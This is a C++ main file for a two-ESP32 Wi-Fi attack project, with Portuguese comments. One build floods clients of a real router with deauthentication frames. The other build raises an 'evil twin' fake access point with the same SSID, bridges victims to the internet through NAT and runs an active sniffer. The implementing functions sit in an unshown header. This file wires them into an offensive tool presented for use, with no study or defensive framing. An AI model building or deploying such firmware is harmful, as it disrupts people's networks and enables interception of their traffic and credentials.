#include "funcoes_evtw.h"

// ---------------------------------------------------------------------------
// Dois firmwares no mesmo projeto, selecionados pelo env do PlatformIO:
//   pio run -e deauth      ->  define FW_DEAUTH     (ESP #1)
//   pio run -e evil_twin   ->  define FW_EVIL_TWIN  (ESP #2)
// ---------------------------------------------------------------------------

#if defined(FW_DEAUTH)

// ====================== ESP #1 : DEAUTH ======================
void setup() {
    Serial.begin(9600);
    delay(1500);
    Serial.println("\n=== ESP #1 : DEAUTH ===");

    enlaceIniciar();       // UART2 (25/26) - recebe estado do AP+NAT
    buscarCanalAlvo();     // acha BSSID e canal do roteador real
    configurarDeauth();    // trava canal + liga sniffer + prepara injecao
                           // (comeca PAUSADO ate o AP+NAT mandar go=1 + MAC a proteger)
}

void loop() {
    loopDeauth();          // detecta clientes e faz flood de deauth
}

#elif defined(FW_EVIL_TWIN)

// ============== ESP #2 : EVIL TWIN + SNIFFER ATIVO ==============
void setup() {
    Serial.begin(9600);
    delay(1500);
    Serial.println("\n=== ESP #2 : EVIL TWIN + SNIFFER ATIVO ===");

    enlaceIniciar();        // UART2 (25/26) - anuncia estado p/ a ESP de deauth
    buscarCanalAlvo();      // mesmo SSID/canal da rede real
    configurarEvilTwin();   // sobe o AP falso (MAC proprio)
    configurarRepetidor();  // conecta na internet real e ativa o NAT
}

void loop() {
    loopRepetidor();        // mantem a internet / reconecta se cair
    delay(10);
}

#else
#error "Selecione um firmware: compile com -e deauth ou -e evil_twin (define FW_DEAUTH / FW_EVIL_TWIN)."
#endif
